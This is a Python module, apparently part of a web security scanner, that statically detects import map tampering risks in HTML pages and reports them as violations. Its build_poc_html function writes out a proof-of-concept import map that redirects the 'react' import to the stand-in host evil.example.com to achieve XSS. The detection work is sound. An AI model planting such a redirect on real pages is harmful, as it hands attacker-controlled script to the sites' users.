"""Import Maps tampering detection (Phase 28-4).

Import Maps are a browser feature that controls how ES module
specifiers are resolved.  A page declares an import map like::

    <script type="importmap">
    {
      "imports": {
        "react": "https://cdn.example.com/react@18.js",
        "lodash": "/vendor/lodash.js"
      }
    }
    </script>

When subsequent code does ``import "react"``, the browser loads the
URL from the map.  Import Maps are a **security boundary** -- if an
attacker can inject or modify an import map entry, they can redirect
any module import to an attacker-controlled URL, achieving XSS.

This module performs STATIC analysis of a page's HTML to detect:

  1. **User-controlled import map**: an ``<script type="importmap">``
     block whose content reflects a user-controlled parameter (heuristic:
     the page URL's query/hash appears inside the JSON).
  2. **Insecure (http://) module URLs**: import map entries pointing to
     plaintext origins -- MITM can substitute the module.
  3. **Cross-origin module URLs without integrity**: import map entries
     pointing to a different origin than the page, with no SRI hash.
     Unlike ``<script src>``, import map entries do NOT support the
     ``integrity`` attribute in the JSON, so cross-origin entries are
     inherently unprotected -- this is flagged as a finding.
  4. **Multiple import maps**: a page with more than one
     ``<script type="importmap">`` -- the second one is ignored by the
     browser (or causes an error), which can be a misconfiguration or
     an injection sign.
  5. **Import map after module script**: per the spec, import maps must
     appear BEFORE any ``<script type="module">``.  A late import map
     is ignored -- if the page relies on it for security-sensitive
     mappings (e.g. redirecting ``react`` to a trusted CDN), the late
     map silently fails, potentially falling back to a relative URL
     that an attacker can poison.
"""
from __future__ import annotations

import json
import re
from urllib.parse import urlparse, parse_qs


# ---------------------------------------------------------------------------
# Tag extraction
# ---------------------------------------------------------------------------
_IMPORTMAP_RE = re.compile(
    r'<script\b[^>]*\btype\s*=\s*["\']importmap["\'][^>]*>(.*?)</script>',
    re.IGNORECASE | re.DOTALL,
)
_MODULE_SCRIPT_RE = re.compile(
    r'<script\b[^>]*\btype\s*=\s*["\']module["\']',
    re.IGNORECASE,
)


def _extract_import_maps(html: str) -> list[dict]:
    """Extract all ``<script type="importmap">`` blocks from the HTML.

    Returns a list of dicts with:
      * ``raw``      -- the raw text content of the script block
      * ``json``     -- the parsed JSON dict (or None if invalid)
      * ``start``    -- character offset of the block in the HTML
      * ``valid``    -- whether the JSON parsed successfully
    """
    maps: list[dict] = []
    for m in _IMPORTMAP_RE.finditer(html):
        raw = m.group(1).strip()
        start = m.start()
        parsed = None
        valid = False
        try:
            parsed = json.loads(raw)
            valid = isinstance(parsed, dict)
        except (json.JSONDecodeError, TypeError):
            pass
        maps.append({
            "raw": raw,
            "json": parsed,
            "start": start,
            "valid": valid,
        })
    return maps


def _is_cross_origin(page_url: str, resource_url: str) -> bool:
    """Check whether ``resource_url`` is on a different origin than ``page_url``."""
    if not resource_url:
        return False
    # Relative URLs are same-origin.
    parsed = urlparse(resource_url)
    if not parsed.scheme or not parsed.netloc:
        return False
    if not page_url:
        return True
    page = urlparse(page_url)
    return (parsed.scheme, parsed.netloc) != (page.scheme, page.netloc)


def _is_insecure_origin(url: str) -> bool:
    """Check whether ``url`` uses an insecure ``http://`` scheme."""
    if not url:
        return False
    parsed = urlparse(url)
    return parsed.scheme == "http"


def analyze_page(html: str | None, page_url: str = "",
                 extra_markers: dict | list | None = None) -> dict:
    """Analyze a page for Import Map tampering vulnerabilities.

    Returns a dict with:

      * ``import_maps``           -- list of parsed import map blocks
      * ``insecure_origins``      -- entries pointing to http://
      * ``cross_origin_entries``  -- entries pointing to a different origin
      * ``multiple_maps``         -- True if more than one import map found
      * ``map_after_module``      -- True if an import map appears after a module script
      * ``user_controlled``       -- True if page_url's query appears in the map JSON
      * ``violations``            -- aggregated list of violation dicts

    ``extra_markers`` lets callers pass additional user-controlled strings
    (e.g. the request params dict or a list of param values) that should
    be treated as user input when checking for reflection in the import
    map JSON.  This handles cases where the URL itself does not carry
    the query string (e.g. params sent separately by the scanner).
    """
    html = html or ""
    page_url = page_url or ""

    maps = _extract_import_maps(html)
    module_script_positions = [m.start() for m in _MODULE_SCRIPT_RE.finditer(html)]

    insecure_origins: list[dict] = []
    cross_origin_entries: list[dict] = []
    violations: list[dict] = []

    for idx, imap in enumerate(maps):
        if not imap["valid"]:
            violations.append({
                "type": "import_map_invalid_json",
                "severity": "medium",
                "title": f"Invalid import map JSON (block #{idx + 1})",
                "evidence": (imap["raw"][:120] + "...") if len(imap["raw"]) > 120 else imap["raw"],
            })
            continue

        parsed = imap["json"]
        imports = parsed.get("imports") or {}
        scopes = parsed.get("scopes") or {}

        # Check each import entry.
        for key, val in imports.items():
            if not isinstance(val, str):
                continue
            if _is_insecure_origin(val):
                insecure_origins.append({"key": key, "url": val})
                violations.append({
                    "type": "import_map_insecure_origin",
                    "severity": "medium",
                    "title": f"Import map entry '{key}' uses insecure http:// origin",
                    "evidence": f'"{key}": "{val}"',
                    "resource_url": val,
                })
            if _is_cross_origin(page_url, val):
                cross_origin_entries.append({"key": key, "url": val})
                violations.append({
                    "type": "import_map_cross_origin",
                    "severity": "medium",
                    "title": (f"Import map entry '{key}' points to cross-origin URL "
                              f"without integrity protection"),
                    "evidence": f'"{key}": "{val}"',
                    "resource_url": val,
                })

        # Check scope entries too.
        for scope_key, scope_imports in scopes.items():
            if not isinstance(scope_imports, dict):
                continue
            for key, val in scope_imports.items():
                if not isinstance(val, str):
                    continue
                if _is_insecure_origin(val):
                    insecure_origins.append({"key": key, "url": val, "scope": scope_key})

    # Multiple import maps.
    if len(maps) > 1:
        violations.append({
            "type": "import_map_multiple",
            "severity": "low",
            "title": f"Page declares {len(maps)} import maps (only the first is used)",
            "evidence": f"{len(maps)} <script type=importmap> blocks found",
        })

    # Import map after module script.
    if maps and module_script_positions:
        first_module = min(module_script_positions)
        for imap in maps:
            if imap["start"] > first_module:
                violations.append({
                    "type": "import_map_after_module",
                    "severity": "medium",
                    "title": "Import map appears after a <script type=module> (ignored by browser)",
                    "evidence": f"import map at offset {imap['start']}, first module at {first_module}",
                })
                break

    # User-controlled: page_url query string (or any of its values) appears
    # in the import map JSON.  We check both the raw query string (handles
    # SSR templates that interpolate the whole query) and each individual
    # param value (handles servers that interpolate only the value, e.g.
    # `?q=evilPayload` -> `"user": "evilPayload"`).  ``extra_markers`` lets
    # callers pass the request params dict directly (useful when the URL
    # does not carry the query string, e.g. the scanner passes params
    # separately).
    parsed_url = urlparse(page_url)
    page_query = parsed_url.query
    user_markers: list[str] = []
    if page_query and len(page_query) > 3:
        user_markers.append(page_query)
    try:
        qs_pairs = parse_qs(page_query, keep_blank_values=True)
    except Exception:
        qs_pairs = {}
    for _k, vals in qs_pairs.items():
        for v in vals:
            if v and len(v) >= 3:
                user_markers.append(v)
    # Merge extra markers from the caller (params dict or value list).
    if extra_markers:
        try:
            if isinstance(extra_markers, dict):
                for _k, v in extra_markers.items():
                    if isinstance(v, str) and len(v) >= 3:
                        user_markers.append(v)
            elif isinstance(extra_markers, (list, tuple)):
                for v in extra_markers:
                    if isinstance(v, str) and len(v) >= 3:
                        user_markers.append(v)
        except Exception:
            pass
    # Dedupe while preserving order.
    seen_markers: set[str] = set()
    unique_markers: list[str] = []
    for m in user_markers:
        if m not in seen_markers:
            seen_markers.add(m)
            unique_markers.append(m)

    matched_marker = ""
    if unique_markers:
        for imap in maps:
            for marker in unique_markers:
                if marker in imap["raw"]:
                    violations.append({
                        "type": "import_map_user_controlled",
                        "severity": "high",
                        "title": "Import map content reflects user-controlled input",
                        "evidence": f"user input '{marker[:40]}' found in import map JSON",
                    })
                    matched_marker = marker
                    break
            if matched_marker:
                break

    return {
        "import_maps": maps,
        "insecure_origins": insecure_origins,
        "cross_origin_entries": cross_origin_entries,
        "multiple_maps": len(maps) > 1,
        "map_after_module": any(
            imap["start"] > min(module_script_positions)
            for imap in maps
            if module_script_positions
        ),
        "user_controlled": bool(matched_marker),
        "violations": violations,
    }


def build_poc_html(page_url: str, violation_type: str = "",
                   resource_url: str = "") -> str:
    """Build a minimal PoC HTML snippet demonstrating the import map issue."""
    if violation_type == "import_map_user_controlled":
        return (
            f'<!-- PoC: Inject into the import map -->\n'
            f'<script type="importmap">\n'
            f'{{"imports": {{"react": "https://evil.example.com/react.js"}}}}\n'
            f'</script>\n'
            f'<script type="module">import "react";</script>\n'
            f'<!-- Attacker controls the module URL -> XSS -->'
        )
    if violation_type == "import_map_cross_origin":
        target = resource_url or "https://cdn.example.com/lib.js"
        return (
            f'<!-- PoC: MITM the cross-origin import map entry -->\n'
            f'<!-- Entry: "{target}" has no integrity protection -->\n'
            f'<!-- An attacker who controls the CDN can substitute arbitrary JS -->'
        )
    return (
        f'<!-- Import map issue: {violation_type} -->\n'
        f'<!-- See: https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap -->'
    )
